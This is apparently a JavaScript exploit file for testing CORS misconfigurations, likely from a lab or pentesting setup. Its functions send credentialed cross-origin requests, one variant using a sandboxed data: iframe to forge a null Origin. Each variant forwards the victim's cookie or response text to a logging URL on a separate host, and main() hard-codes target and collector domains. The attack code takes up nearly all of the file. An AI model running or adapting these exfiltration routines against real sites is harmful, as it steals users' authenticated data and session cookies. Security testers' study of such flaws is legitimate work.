function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}



function CorsReq(url, type, logurl){
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open(type, url, true);

	req.withCredentials = true;
	req.send();

	function reqListener() {
		location=logurl+'?key='+this.document.cookie;
	};
}


function CorsNullReq(url, type, logurl, frameId){
	var elem = document.getElementById(frameId);
	elem.innerHTML = `
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('${type}','${url}',true);
req.withCredentials = true;
req.send();

function reqListener() { 
	location='${logurl}?key='+this.responseText;
};
</script>">
</iframe>`;

}

function SendCors(url, logurl){
	/*
	## Info
	ACAC --- Access-Control-Allow-Credentials
	ACAO --- Access-Contol-Allow-Origin

	## Endpoints
	1) api_creds --- API without ACAC 
	2) api_gen   --- Auto generated ACAO
	3) api_null  --- Null value in ACAO
	
	## Functions
	CorsReq(url, type, logurl);
	CorsNullReq(url, type, logurl, frameId);
	*/

	// Request without modify Origin
	CorsReq(url+"creds", "get", logurl);
	CorsReq(url+"gen", "get", logurl);
	CorsReq(url+"null", "get", logurl);
	CorsReq(url+"correct", "get", logurl);

	CorsReq(url+"creds", "post", logurl);
	CorsReq(url+"gen", "post", logurl);
	CorsReq(url+"null", "post", logurl);
	CorsReq(url+"correct", "post", logurl);
	sleep(500);


	// Request with null origin
	CorsNullReq(url+"creds", "get", logurl, "creds_get_iframe");
	CorsNullReq(url+"gen", "get", logurl, "gen_get_iframe");
	CorsNullReq(url+"null", "get", logurl, "null_get_iframe");
	CorsNullReq(url+"correct", "get", logurl, "correct_get_iframe");
	
	CorsNullReq(url+"creds", "post", logurl, "creds_post_iframe");
	CorsNullReq(url+"gen", "post", logurl, "gen_post_iframe");
	CorsNullReq(url+"null", "post", logurl, "null_post_iframe");
	CorsNullReq(url+"correct", "post", logurl, "correct_post_iframe");
}

function main(){
	// URLS FOR CSRF
	var url = "https://discovery.sidneyjob.ru/";
	var logurl = "https://info.discovery.sidneyjob.ru/log";



	// PrepareForm(url+"reset_password_");
	// PrepareImg(url+"reset_password_");
	// FetchRequests(url+"reset_password_");

	// SendCors(url+"api_", logurl);
}


